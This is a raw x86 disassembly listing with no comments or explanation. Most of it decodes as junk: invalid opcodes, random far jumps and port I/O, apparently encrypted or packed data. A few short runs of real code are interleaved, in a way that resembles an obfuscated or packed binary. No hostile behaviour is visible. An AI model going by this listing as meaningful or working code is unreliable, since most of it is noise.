  40b39a:	mov    edi,0xebc20980
  40b39f:	xor    al,0xba
  40b3a1:	test   eax,0xc715ea1b
  40b3a7:	std    
  40b3a8:	cld    
  40b3a9:	ret    
  40b3aa:	and    dh,BYTE PTR [eax+0x62cae7bd]
  40b3b0:	push   esp
  40b3b1:	add    ebx,DWORD PTR [ebp-0x47]
  40b3b4:	xor    cl,BYTE PTR [esi+ebp*2]
  40b3b7:	adc    eax,0xb392df19
  40b3bc:	or     ebp,ecx
  40b3be:	xchg   ecx,eax
  40b3bf:	xchg   esp,eax
  40b3c0:	loopne 0x40b406
  40b3c2:	mov    WORD PTR [edi-0x4f],?
  40b3c5:	and    dh,BYTE PTR [edx+0x27]
  40b3c8:	pop    ebp
  40b3c9:	ins    BYTE PTR es:[edi],dx
  40b3ca:	jb     0x40b408
  40b3cc:	(bad)  
  40b3cd:	mov    al,0x98
  40b3cf:	push   cs
  40b3d0:	inc    edx
  40b3d1:	mov    eax,0xc8640cfc
  40b3d6:	aam    0xb1
  40b3d8:	jne    0x40b376
  40b3da:	aaa    
  40b3db:	ret    
  40b3dc:	cli    
  40b3dd:	sub    DWORD PTR [ebp-0x261ade5b],ebx
  40b3e3:	test   BYTE PTR [ebp+esi*8+0x1c2dc56d],0x6c
  40b3eb:	fistp  WORD PTR [bp+si-0xa9a]
  40b3f0:	mov    ah,0x5f
  40b3f2:	imul   eax,DWORD PTR [esi+edi*8+0x416f9939],0x346a9ef3
  40b3fd:	dec    esp
  40b3fe:	dec    ebx
  40b3ff:	push   cs
  40b400:	popf   
  40b401:	mov    cl,0xe4
  40b403:	add    eax,0xc7534639
  40b408:	scas   eax,DWORD PTR es:[edi]
  40b409:	aaa    
  40b40a:	jge    0x40b3fd
  40b40c:	hlt    
  40b40d:	(bad)  
  40b40e:	(bad)  
  40b40f:	imul   eax,DWORD PTR [edi],0x50
  40b412:	lods   eax,DWORD PTR ds:[esi]
  40b413:	cmp    bl,BYTE PTR [edi-0x3]
  40b416:	adc    bl,ch
  40b418:	or     dh,BYTE PTR [eax+0x5c]
  40b41b:	xor    BYTE PTR [ecx-0x3e],dl
  40b41e:	mov    ds:0xd190e7a1,eax
  40b423:	cwde   
  40b424:	pop    ecx
  40b425:	mov    DWORD PTR [edx],ecx
  40b427:	fistp  DWORD PTR [ecx]
  40b429:	add    bh,bl
  40b42b:	sti    
  40b42c:	(bad)  
  40b42d:	out    0xe2,eax
  40b42f:	cmc    
  40b430:	in     eax,dx
  40b431:	pop    ebp
  40b432:	add    BYTE PTR [edi],al
  40b434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b435:	add    ebp,DWORD PTR [esi]
  40b437:	pushf  
  40b438:	out    0x4f,al
  40b43a:	mov    esi,0xb18af26f
  40b43f:	(bad)  
  40b440:	jl     0x40b48f
  40b442:	inc    edi
  40b443:	dec    edx
  40b444:	jo     0x40b3ec
  40b446:	pop    esi
  40b447:	adc    eax,0xd6e2ced4
  40b44c:	mov    al,0x34
  40b44e:	icebp  
  40b44f:	xor    BYTE PTR [edi+0x59],bl
  40b452:	mov    dh,0x71
  40b454:	call   0x4270f4b9
  40b459:	mov    ds:0x5aeb622,al
  40b45e:	inc    esp
  40b45f:	lods   al,BYTE PTR ds:[esi]
  40b460:	lds    ebx,FWORD PTR [edi-0x2c]
  40b463:	add    esp,edx
  40b465:	lock stos BYTE PTR es:[edi],al
  40b467:	dec    esi
  40b468:	repz xor eax,0x2c7eb5cd
  40b46e:	push   esi
  40b46f:	adc    eax,DWORD PTR [esi]
  40b471:	inc    ebx
  40b472:	or     DWORD PTR [edx],0x6f
  40b475:	and    cl,BYTE PTR [esi-0x38]
  40b478:	push   ecx
  40b479:	stos   DWORD PTR es:[edi],eax
  40b47a:	adc    al,0x85
  40b47c:	sub    esi,DWORD PTR [esi]
  40b47e:	icebp  
  40b47f:	rcr    ebp,1
  40b481:	inc    eax
  40b482:	in     eax,0x7e
  40b484:	mov    eax,ds:0x25571445
  40b489:	push   ebp
  40b48a:	push   ds
  40b48b:	sbb    al,0xf0
  40b48d:	mov    eax,ds:0x79857f7a
  40b492:	sbb    BYTE PTR [ebx],dl
  40b494:	jmp    0x40b4e9
  40b496:	pop    esp
  40b497:	fbstp  TBYTE PTR [ebx+ecx*2-0x10196e9f]
  40b49e:	(bad)  
  40b4a0:	mov    BYTE PTR [edx-0x2e],bl
  40b4a3:	mov    edi,0x493088b3
  40b4a8:	cwde   
  40b4a9:	cwde   
  40b4aa:	push   esi
  40b4ab:	cwde   
  40b4ac:	arpl   WORD PTR [edx+0x6dddf4a7],bp
  40b4b2:	dec    edx
  40b4b3:	xchg   ebx,eax
  40b4b4:	sbb    ebx,DWORD PTR ds:0xfca3c143
  40b4ba:	sub    dl,BYTE PTR [ecx+0x708185fd]
  40b4c0:	pop    esp
  40b4c1:	push   bp
  40b4c3:	inc    esi
  40b4c4:	pop    esp
  40b4c5:	push   edi
  40b4c6:	out    dx,eax
  40b4c7:	sbb    eax,DWORD PTR [eax-0x43]
  40b4ca:	(bad)  
  40b4cb:	les    eax,FWORD PTR [esi]
  40b4cd:	retf   
  40b4ce:	aad    0xe4
  40b4d0:	mov    ebx,DWORD PTR [edx-0x3e]
  40b4d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b4d4:	inc    esp
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	cmp    cl,BYTE PTR [ecx]
  40b509:	jge    0x40b4ad
  40b50b:	call   0x38bf3400
  40b510:	jl     0x40b590
  40b512:	jle    0x40b51b
  40b514:	(bad)  
  40b515:	sti    
  40b516:	out    dx,eax
  40b517:	mov    ch,0x3e
  40b519:	push   esi
  40b51a:	sbb    ebx,DWORD PTR [edx]
  40b51c:	mov    esi,ebx
  40b51e:	jne    0x40b4dd
  40b520:	dec    ebx
  40b521:	lock or DWORD PTR [ebp+esi*8-0x1e5afdf2],ebx
  40b529:	scas   al,BYTE PTR es:[edi]
  40b52a:	and    al,0xf6
  40b52c:	jecxz  0x40b542
  40b52e:	(bad)  
  40b52f:	(bad)  
  40b530:	push   ebp
  40b531:	inc    edx
  40b532:	xor    al,0xef
  40b534:	into   
  40b535:	mov    edi,0x54b9daa3
  40b53a:	adc    DWORD PTR [eax+eax*4],edx
  40b53d:	lds    esp,FWORD PTR [esi-0x32a8360b]
  40b543:	mov    ah,0x9b
  40b545:	or     DWORD PTR [edx+0x5705e30],esp
  40b54b:	mov    ?,WORD PTR ds:0x51e2b3f
  40b551:	push   ds
  40b552:	rol    al,1
  40b554:	xor    eax,0x95c06d16
  40b559:	push   ebx
  40b55a:	push   ds
  40b55b:	push   ss
  40b55c:	and    cl,BYTE PTR [esi-0x6]
  40b55f:	sub    DWORD PTR [esi-0x33d846c4],esp
  40b565:	and    dl,ah
  40b567:	in     al,0xe1
  40b569:	ja     0x40b5a8
  40b56b:	inc    ebx
  40b56c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b56d:	call   FWORD PTR [ecx+edx*2-0x69]
  40b571:	or     al,0x15
  40b573:	and    BYTE PTR [ecx-0x12],dh
  40b576:	sti    
  40b577:	pop    edx
  40b578:	stos   BYTE PTR es:[edi],al
  40b579:	push   ds
  40b57a:	iret   
  40b57b:	xchg   ebp,eax
  40b57c:	cs je  0x40b521
  40b57f:	mov    bl,cl
  40b581:	scas   eax,DWORD PTR es:[edi]
  40b582:	scas   eax,DWORD PTR es:[edi]
  40b583:	xchg   BYTE PTR [esi],al
  40b585:	adc    al,0x89
  40b587:	fidivr WORD PTR ds:0x774efcaa
  40b58d:	inc    esp
  40b58e:	fnstenv [ebx+edi*4+0x5db01ace]
  40b595:	ror    BYTE PTR [edx+eax*4+0x668c2d3f],cl
  40b59c:	pop    es
  40b59d:	mov    bh,0x81
  40b59f:	in     eax,dx
  40b5a0:	in     eax,0xe9
  40b5a2:	ss pop ebp
  40b5a4:	adc    BYTE PTR [ebx+ecx*2+0x6b],0x88
  40b5a9:	adc    ch,BYTE PTR [ebp-0x54f1fe1c]
  40b5af:	jmp    0x627a:0x78de1434
  40b5b6:	or     eax,0x9647218
  40b5bb:	mov    eax,ds:0xab526dba
  40b5c0:	cmp    DWORD PTR [eax],edi
  40b5c2:	xchg   ebp,eax
  40b5c3:	push   es
  40b5c4:	and    al,BYTE PTR [edx+0x1f]
  40b5c7:	and    esp,DWORD PTR [edi+0x60]
  40b5ca:	xlat   BYTE PTR ds:[ebx]
  40b5cb:	ins    BYTE PTR es:[edi],dx
  40b5cc:	cli    
  40b5cd:	cdq    
  40b5ce:	cld    
  40b5cf:	lods   eax,DWORD PTR ds:[esi]
  40b5d0:	ja     0x40b5b9
  40b5d2:	in     al,0x71
  40b5d4:	test   DWORD PTR [ecx-0x7],eax
  40b5d7:	leave  
  40b5d8:	push   ss
  40b5d9:	or     eax,0xddebdf1a
  40b5de:	ja     0x40b573
  40b5e0:	mov    edi,0xcc80c3ff
  40b5e5:	mov    esi,0x503d8681
  40b5ea:	add    ebx,DWORD PTR [edx]
  40b5ec:	bswap  esp
  40b5ee:	les    ebp,FWORD PTR [eax-0x67]
  40b5f1:	push   ecx
  40b5f2:	sub    al,0x5a
  40b5f4:	lods   eax,DWORD PTR ds:[esi]
  40b5f5:	mov    dh,0x18
  40b5f7:	inc    ebx
  40b5f8:	retf   0xd411
  40b5fb:	and    BYTE PTR [ecx-0x34],dh
  40b5fe:	lods   al,BYTE PTR ds:[esi]
  40b5ff:	jle    0x40b651
  40b601:	sub    al,0x28
  40b603:	shl    dl,0xad
  40b606:	rcr    BYTE PTR [ecx],0x25
  40b609:	xor    cl,BYTE PTR [ecx+0x7c]
  40b60c:	jmp    0x50e9d924
  40b611:	inc    eax
  40b612:	sbb    BYTE PTR [esp+eax*1-0xd],dh
  40b616:	loop   0x40b658
  40b618:	adc    BYTE PTR [ecx+0x15be297d],bh
  40b61e:	shl    al,1
  40b620:	sub    dl,BYTE PTR [edx-0x2a]
  40b623:	pusha  
  40b624:	ss inc ebx
  40b626:	jp     0x40b5d4
  40b628:	fsubr  DWORD PTR [edi-0x79]
  40b62b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b62c:	stos   DWORD PTR es:[edi],eax
  40b62d:	nop
  40b62e:	fcmovnb st,st(6)
  40b630:	pop    ds
  40b631:	ja     0x40b609
  40b633:	outs   dx,DWORD PTR ds:[esi]
  40b634:	xor    BYTE PTR [eax],dh
  40b636:	jno    0x40b648
  40b638:	pushf  
  40b639:	and    ecx,ebx
  40b63b:	and    edi,ebp
  40b63d:	sub    esp,DWORD PTR [esi+0x4c]
  40b640:	xchg   BYTE PTR [ecx+0x5f4678e],al
  40b646:	out    dx,eax
  40b647:	mov    bh,0xa8
  40b649:	aaa    
  40b64a:	pop    ebp
  40b64b:	repz fldenv [ebx+ebp*8+0x1f]
  40b650:	xchg   edi,eax
  40b651:	adc    esi,DWORD PTR ds:0x92d55b20
  40b657:	sub    BYTE PTR [ebx-0x55e24f77],dh
  40b65d:	push   edx
  40b65e:	push   edx
  40b65f:	rcl    DWORD PTR [eax],cl
  40b661:	add    edi,DWORD PTR [eax+0x43f0dae1]
  40b667:	jo     0x40b635
  40b669:	sub    al,0x3d
  40b66b:	int    0xad
  40b66d:	sahf   
  40b66e:	sbb    ah,BYTE PTR [edx-0x9ebbc54]
  40b674:	repnz dec ebp
  40b676:	xchg   ebx,eax
  40b677:	aaa    
  40b678:	and    DWORD PTR [esi+0x19],0xffffffb5
  40b67c:	loope  0x40b67f
  40b67e:	push   ebp
  40b67f:	not    ah
  40b681:	xchg   esi,eax
  40b682:	add    ebx,0xb27999de
  40b688:	das    
  40b689:	mov    bh,0x80
  40b68b:	mov    esp,esp
  40b68d:	jge    0x40b6c0
  40b68f:	sti    
  40b690:	or     ecx,DWORD PTR [ebp+0x38]
  40b693:	cmp    al,0x56
  40b695:	jae    0x40b6d1
  40b697:	shr    bl,1
  40b699:	hlt    
  40b69a:	pop    edi
  40b69b:	ret    0xb0f9
  40b69e:	imul   ebx,DWORD PTR [edi],0xffffffaa
  40b6a1:	jns    0x40b6dc
  40b6a3:	repz add si,ax
  40b6a7:	sbb    BYTE PTR [eax+0xb596db4],dh
  40b6ad:	clc    
  40b6ae:	sbb    bl,bh
  40b6b0:	adc    BYTE PTR [ecx-0x6],bh
  40b6b3:	mov    edi,0x50b266a3
  40b6b8:	in     eax,dx
  40b6b9:	jmp    0x5a91faad
  40b6be:	and    al,BYTE PTR [ebx+0x7d]
  40b6c1:	pop    esp
  40b6c2:	cli    
  40b6c3:	clc    
  40b6c4:	repz dec esi
  40b6c6:	sub    eax,DWORD PTR [ecx+eax*4+0x13d7585c]
  40b6cd:	sbb    ebp,esi
  40b6cf:	xor    bl,bh
  40b6d1:	sbb    bl,BYTE PTR [eax]
  40b6d3:	sbb    BYTE PTR [ebx],ch
  40b6d5:	mov    ecx,esp
  40b6d7:	add    eax,0x9f477c33
  40b6dc:	aaa    
  40b6dd:	pusha  
  40b6de:	and    dh,bh
  40b6e0:	or     dl,BYTE PTR [ebp+0xd]
  40b6e3:	test   BYTE PTR [ebx-0x1e],al
  40b6e6:	lods   eax,DWORD PTR ds:[esi]
  40b6e7:	jmp    0x835024d1
  40b6ec:	inc    edx
  40b6ed:	fwait
  40b6ee:	cmp    BYTE PTR [edi],dl
  40b6f0:	xchg   esi,eax
  40b6f1:	hlt    
  40b6f2:	xor    al,0x97
  40b6f4:	mov    bl,0x87
  40b6f6:	xor    DWORD PTR [ecx-0x157e6b86],eax
  40b6fc:	inc    edi
  40b6fd:	or     edi,ebp
  40b6ff:	lock mov DWORD PTR [esi-0x4ae2d1fa],esi
  40b706:	cdq    
  40b707:	test   eax,0xaf41eae0
  40b70c:	jnp    0x40b707
  40b70e:	rcr    DWORD PTR [ebx+0x68074fb8],0x98
  40b715:	mov    BYTE PTR [eax+0xa3bb4c3],bh
  40b71b:	dec    eax
  40b71c:	retf   0x5d3d
  40b71f:	xor    DWORD PTR [eax-0x21a007a8],eax
  40b725:	fucomip st,st(5)
  40b727:	sub    eax,0xe7625048
  40b72c:	inc    esi
  40b72d:	jb     0x40b6de
  40b72f:	sub    eax,0x1079a2f5
  40b734:	mov    dl,BYTE PTR [eax]
  40b736:	xchg   ebx,eax
  40b737:	dec    ecx
  40b738:	sbb    al,BYTE PTR ds:0x8f1994c
  40b73e:	ret    
  40b73f:	dec    ecx
  40b740:	into   
  40b741:	mov    fs,WORD PTR ds:0x98a2101e
  40b747:	and    al,0x41
  40b749:	jle    0x40b7b7
  40b74b:	cmp    DWORD PTR [ebx],ebp
  40b74d:	jecxz  0x40b709
  40b74f:	mov    esi,0x5304984e
  40b754:	push   0xfb9cbf9a
  40b759:	push   DWORD PTR [ebp-0x30]
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	js     0x40b7d4
  40b78c:	not    DWORD PTR [edx]
  40b78e:	mov    dl,0xfe
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	cmp    ebx,DWORD PTR [ecx+0x269aca2a]
  40b79c:	add    ecx,edi
  40b79e:	fcomi  st,st(6)
  40b7a0:	push   0x8b23d82b
  40b7a5:	xchg   esp,eax
  40b7a6:	ja     0x40b7e2
  40b7a8:	cdq    
  40b7a9:	push   edi
  40b7aa:	jns    0x40b7f4
  40b7ac:	jne    0x40b7d5
  40b7ae:	out    dx,al
  40b7af:	cmovns eax,DWORD PTR [esi-0x53]
  40b7b3:	sub    esp,DWORD PTR [edi+eiz*4]
  40b7b6:	or     al,0x2a
  40b7b8:	sahf   
  40b7b9:	into   
  40b7ba:	sub    al,0xf9
  40b7bc:	xchg   ebp,eax
  40b7bd:	adc    DWORD PTR [ebp+ebp*8-0x5bbc1745],0x9fc7c2c7
  40b7c8:	into   
  40b7c9:	mov    edi,0x92f0cbdb
  40b7ce:	je     0x40b775
  40b7d0:	sbb    DWORD PTR [ebp+0x12],ecx
  40b7d3:	sub    BYTE PTR [edx-0x48755647],dh
  40b7d9:	sbb    al,0x76
  40b7db:	iret   
  40b7dc:	dec    edx
  40b7dd:	mov    ecx,0xddae2393
  40b7e2:	xor    al,0x95
  40b7e4:	jne    0x40b809
  40b7e6:	sahf   
  40b7e7:	or     cl,ch
  40b7e9:	test   BYTE PTR [edx+eax*4],cl
  40b7ec:	test   BYTE PTR [ecx+0x1f4791d5],0x36
  40b7f3:	inc    eax
  40b7f4:	rcl    edx,1
  40b7f6:	push   edx
  40b7f7:	dec    edx
  40b7f8:	dec    ebp
  40b7f9:	adc    DWORD PTR [ecx-0x68],esp
  40b7fc:	outs   dx,DWORD PTR ds:[esi]
  40b7fd:	in     eax,dx
  40b7fe:	sti    
  40b7ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b800:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b801:	std    
  40b802:	add    ebp,DWORD PTR [edx]
  40b804:	aam    0x5d
  40b806:	fs jp  0x40b853
  40b809:	mov    ah,0xbb
  40b80b:	call   0x1538:0xd6c288ea
  40b812:	adc    BYTE PTR [ebx],ah
  40b814:	mov    esp,0xf1ecc68b
  40b819:	jb     0x40b836
  40b81b:	adc    BYTE PTR [eax],bh
  40b81d:	mov    al,0x7d
  40b81f:	xchg   esp,eax
  40b820:	arpl   WORD PTR [esi],cx
  40b822:	push   es
  40b823:	and    BYTE PTR [ebx+0x48],bh
  40b826:	mov    ds:0x22123e08,al
  40b82b:	hlt    
  40b82c:	retf   
  40b82d:	imul   ecx,DWORD PTR [esp+ecx*2-0x5c],0x134d3e37
  40b835:	add    eax,0xb239dfa6
  40b83a:	shr    BYTE PTR [ebx-0xdf7e0e],0xe3
  40b841:	mov    ebx,0x7646a0fc
  40b846:	and    dh,bl
  40b848:	sub    al,0xab
  40b84a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b84b:	in     al,0xbd
  40b84d:	jae    0x40b855
  40b84f:	inc    ebx
  40b850:	mov    edx,0xcc483e1
  40b855:	xor    eax,0x3e28fb23
  40b85a:	cwde   
  40b85b:	xor    al,0xb5
  40b85d:	cmp    ebp,ecx
  40b85f:	push   ebx
  40b860:	pop    ds
  40b861:	daa    
  40b862:	into   
  40b863:	enter  0x2549,0x4c
  40b867:	ins    DWORD PTR es:[edi],dx
  40b868:	test   DWORD PTR [esi+0x3555388f],0x4c6602d9
  40b872:	aaa    
  40b873:	fs mov esp,0x2bcdd214
  40b879:	jg     0x40b829
  40b87b:	inc    edx
  40b87c:	adc    cl,cl
  40b87e:	into   
  40b87f:	sbb    dl,bh
  40b881:	xchg   BYTE PTR [eax+0x6eee68d3],ah
  40b887:	es call 0x30db:0x42cf87b7
  40b88f:	out    0x1a,al
  40b891:	scas   eax,DWORD PTR es:[edi]
  40b892:	stc    
  40b893:	add    ecx,ebx
  40b895:	inc    ebp
  40b896:	imul   edx,esi,0xd
  40b899:	in     eax,dx
  40b89a:	mov    edi,0x7d6c2704
  40b89f:	xchg   ecx,eax
  40b8a0:	jmp    0x40b8a6
  40b8a2:	mov    eax,ds:0x93186d70
  40b8a7:	xlat   BYTE PTR ds:[ebx]
  40b8a8:	ret    0xcbeb
  40b8ab:	dec    ebx
  40b8ac:	sub    al,0x57
  40b8ae:	aam    0x34
  40b8b0:	mov    ecx,0xf67d7ab9
  40b8b5:	sub    al,0x75
  40b8b7:	in     al,0xb4
  40b8b9:	fucompp 
  40b8bb:	bswap  edi
  40b8bd:	popa   
  40b8be:	aas    
  40b8bf:	mov    DWORD PTR ds:0x92ca1026,esp
  40b8c5:	or     bh,BYTE PTR [edx]
  40b8c7:	sub    BYTE PTR [edx+0x47],dl
  40b8ca:	repz mov al,0x89
  40b8cd:	int    0x30
  40b8cf:	jmp    0xd4c9:0x655550fc
  40b8d6:	pop    ss
  40b8d7:	cs data16 sbb al,0xc
  40b8db:	out    dx,eax
  40b8dc:	sub    ch,0x34
  40b8df:	pop    ebx
  40b8e0:	int3   
  40b8e1:	mov    bh,0x3e
  40b8e3:	push   0x5
  40b8e5:	jbe    0x40b88c
  40b8e7:	test   eax,0x1b87ce22
  40b8ec:	push   edx
  40b8ed:	in     al,dx
  40b8ee:	mov    ebx,0x331a8726
  40b8f3:	(bad)  
  40b8f5:	add    eax,0xf48a682e
  40b8fa:	ret    
  40b8fb:	leave  
  40b8fc:	cmp    al,0x81
  40b8fe:	jb     0x40b914
  40b900:	ret    0xedef
  40b903:	arpl   WORD PTR [eax+0x60a53eb],di
  40b909:	adc    edx,DWORD PTR [esi+edi*4+0x6c]
  40b90d:	mov    ah,0x21
  40b90f:	sbb    BYTE PTR [edi-0x4b],0xde
  40b913:	dec    edi
  40b914:	sahf   
  40b915:	mov    esi,0xfa220f2d
  40b91a:	jb     0x40b944
  40b91c:	mov    al,ds:0xd55d254b
  40b921:	push   esp
  40b922:	xchg   ecx,eax
  40b923:	and    al,0xd8
  40b925:	jb     0x40b98a
  40b927:	fcomp  QWORD PTR [ecx]
  40b929:	add    BYTE PTR [edx],ah
  40b92b:	mov    eax,ds:0x51234bd5
  40b930:	and    dl,BYTE PTR [eax-0x19e6df3]
  40b936:	mov    ds:0x66f75571,al
  40b93b:	mov    BYTE PTR [edi],dl
  40b93d:	or     ebx,DWORD PTR [esi]
  40b93f:	cs xchg esi,eax
  40b941:	outs   dx,DWORD PTR ds:[esi]
  40b942:	ret    
  40b943:	pushf  
  40b944:	sub    DWORD PTR [esi],edx
  40b946:	xchg   ebp,eax
  40b947:	(bad)  
  40b948:	jmp    FWORD PTR [ebp-0x80]
  40b94b:	adc    ebp,DWORD PTR [esi+0x2a]
  40b94e:	jmp    0x7403:0x2dd1b9f2
  40b955:	adc    bl,BYTE PTR [esi]
  40b957:	in     eax,dx
  40b958:	jmp    0x1268:0xe43a47eb
  40b95f:	xchg   DWORD PTR [esi+0x52febb6a],esp
  40b965:	loopne 0x40b958
  40b967:	sbb    DWORD PTR [esi-0x18],esi
  40b96a:	xor    BYTE PTR [ebx+0x3],ch
  40b96d:	sbb    BYTE PTR [ebx],dl
  40b96f:	cmp    al,0x69
  40b971:	and    BYTE PTR [ebp+0x7e],bl
  40b974:	repnz test al,0xe6
  40b978:	into   
  40b979:	and    BYTE PTR [esi],ch
  40b97b:	in     ax,0x59
  40b97e:	push   0xffffffef
  40b980:	mov    ch,0x7c
  40b982:	dec    ecx
  40b983:	sti    
  40b984:	and    BYTE PTR ds:0x125d7a23,dl
  40b98a:	dec    ecx
  40b98b:	mov    ch,0xed
  40b98d:	xchg   ecx,eax
  40b98e:	push   esp
  40b98f:	mov    esi,0x7145a74f
  40b994:	in     eax,0xe7
  40b996:	ror    edi,0x95
  40b999:	ret    0xbe48
  40b99c:	sbb    al,0x9c
  40b99e:	fstp   DWORD PTR [ecx-0x3b38114d]
  40b9a4:	adc    ch,BYTE PTR [edi+0x4497b779]
  40b9aa:	mov    esp,0xa33fb67e
  40b9af:	jns    0x40b9f7
  40b9b1:	ja     0x40b9ad
  40b9b3:	ja     0x40b9f2
  40b9b5:	inc    ebp
  40b9b6:	push   ebx
  40b9b7:	inc    eax
  40b9b8:	stos   BYTE PTR es:[edi],al
  40b9b9:	sub    esp,DWORD PTR [ebx-0x33]
  40b9bc:	out    0x66,eax
  40b9be:	repnz ins BYTE PTR es:[edi],dx
  40b9c0:	push   0x2b98544d
  40b9c5:	push   ecx
  40b9c6:	imul   ebx,DWORD PTR [ebp+0x77],0x12
  40b9ca:	fisubr DWORD PTR [edi+0x22562b15]
  40b9d0:	mov    al,ds:0x6d16f2b8
  40b9d5:	rol    DWORD PTR [esi],1
  40b9d7:	cmp    DWORD PTR [esi],0xffffffe1
  40b9da:	lea    ebp,[ecx+0x47e0458b]
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x2cb1a808],eax
  40ba0f:	sub    al,0xd8
  40ba11:	jl     0x40ba10
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	retf   0x35f6
  40ba1c:	push   ecx
  40ba1d:	jmp    0x81ba:0x20eb5815
  40ba24:	mov    edx,0x34bdab1a
  40ba29:	mov    bl,0xc2
  40ba2b:	push   esi
  40ba2c:	xor    ch,BYTE PTR [ecx+0x632d8aee]
  40ba32:	int    0x56
  40ba34:	add    ebx,DWORD PTR [ebx]
  40ba36:	fstp   st(0)
  40ba38:	nop
  40ba39:	stos   DWORD PTR es:[edi],eax
  40ba3a:	in     eax,0x9f
  40ba3c:	iret   
  40ba3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba3e:	mov    eax,ds:0x32e243f9
  40ba43:	mov    dl,0x70
  40ba45:	or     edx,esi
  40ba47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba48:	repz leave 
  40ba4a:	(bad)
  40ba4e:	daa    
  40ba4f:	es test al,0x67
  40ba52:	cmc    
  40ba53:	or     ebp,DWORD PTR [ebx]
  40ba55:	cmp    BYTE PTR [edx+0x49],bl
  40ba58:	fisubr WORD PTR [edi+eiz*2+0x73]
  40ba5c:	mul    BYTE PTR [ebp-0x38]
  40ba5f:	xchg   esp,eax
  40ba60:	enter  0xd151,0xdb
  40ba64:	xchg   ebx,edi
  40ba66:	dec    esp
  40ba67:	push   ebx
  40ba68:	add    DWORD PTR [esi],ebp
  40ba6a:	mov    dh,0xe3
  40ba6c:	div    BYTE PTR [edx]
  40ba6e:	mov    eax,ebx
  40ba70:	adc    BYTE PTR [eax],bh
  40ba72:	shl    bl,1
  40ba74:	mov    eax,ds:0x2553d2ac
  40ba79:	dec    ebx
  40ba7a:	(bad)  
  40ba7b:	jne    0x40ba21
  40ba7d:	xor    eax,0x98f3b5bf
  40ba82:	xor    ebp,edi
  40ba84:	in     al,dx
  40ba85:	mov    ?,WORD PTR es:[eax-0x19c1be05]
  40ba8c:	xrelease xchg BYTE PTR [ebx+0x38],bh
  40ba90:	pop    esp
  40ba91:	pop    ebx
  40ba92:	inc    eax
  40ba93:	lock mov eax,ds:0x4d10fb18
  40ba99:	cmp    ch,BYTE PTR [ebx+eiz*4+0x59e97b08]
  40baa0:	mov    esp,0x7869682
  40baa5:	es (bad) 
  40baa7:	push   cs
  40baa8:	test   BYTE PTR [edx-0x67],ah
  40baab:	pop    eax
  40baac:	popf   
  40baad:	(bad)  
  40baae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baaf:	ds call 0xb749:0x1e316346
  40bab7:	inc    edi
  40bab8:	nop
  40bab9:	add    ebp,DWORD PTR [esi-0x2f]
  40babc:	lods   eax,DWORD PTR ds:[esi]
  40babd:	inc    ebx
  40babe:	push   0x46
  40bac0:	inc    ebx
  40bac1:	cdq    
  40bac2:	xchg   ebx,eax
  40bac3:	mov    ecx,0xc3bfec4c
  40bac8:	into   
  40bac9:	jl     0x40bac8
  40bacb:	sub    DWORD PTR [ecx-0x44fd72d3],ebx
  40bad1:	out    dx,al
  40bad2:	ret    0x2a2c
  40bad5:	jge    0x40bb0b
  40bad7:	ja     0x40bacb
  40bad9:	xchg   BYTE PTR [edi+ebx*4-0x1a4af0c],ah
  40bae0:	jae    0x40ba88
  40bae2:	fadd   QWORD PTR [esi-0xca9ee65]
  40bae8:	xchg   esi,eax
  40bae9:	push   0xfffffffe
  40baeb:	inc    edx
  40baec:	fsubr  QWORD PTR [eax]
  40baee:	push   ds
  40baef:	jecxz  0x40baa5
  40baf1:	rcl    BYTE PTR ds:0x8c3add60,cl
  40baf7:	dec    DWORD PTR [esp+ebx*2-0x1a]
  40bafb:	retf   
  40bafc:	add    cl,dh
  40bafe:	lea    esp,[ebp-0x5001dff1]
  40bb04:	sub    ch,BYTE PTR [ecx]
  40bb06:	lock jmp 0x40bb1c
  40bb09:	mov    edx,DWORD PTR [edx-0x51]
